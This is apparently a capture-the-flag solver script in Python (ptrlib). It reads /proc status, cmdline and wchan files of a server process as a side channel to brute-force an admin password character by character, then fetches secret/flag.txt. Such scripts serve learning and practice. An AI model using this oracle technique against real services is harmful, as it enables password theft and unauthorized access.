from ptrlib import *
from tqdm import tqdm
import os

logger.level = 0
HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "10022"))

password = ""
while True:
    for c in tqdm("0123456789abcdef"):
        while True:
            s1 = Socket(HOST, PORT)
            time.sleep(0.1)
            s2 = Socket(HOST, PORT)

            # 1. Guess PID
            s1.sendlineafter(": ", "guest")
            s1.sendlineafter(": ", "guest")
            s1.sendlineafter("File: ", "/proc/self/status")
            pid = int(s1.recvlineafter("Tgid:"))
            for _ in range(10):
                pid += 1
                s1.sendlineafter("File: ", f"/proc/{pid}/cmdline")
                cmdline = s1.recvuntil("File: ", drop=True)
                s1.unget("File: ")
                if cmdline.startswith(b"python3"):
                    #print(f"[+] pid={pid}")
                    break
            else:
                continue
            break

        # 2. Status as oracle
        s2.sendlineafter(": ", "admin")
        s2.sendafter(": ", password + c)
        s1.sendlineafter("File: ", f"/proc/{pid}/wchan") # or stat->flags
        if b"wait_woken" in s1.recvuntil("File: ", drop=True):
            password += c
            print(f"Searching: {password}")
            break

        s1.close()
        s2.close()

    else:
        break

sock = Socket(HOST, PORT)
sock.sendlineafter(": ", "admin")
sock.sendlineafter(": ", password)
sock.sendlineafter("File: ", "secret/flag.txt")
print(sock.recvline())
sock.close()
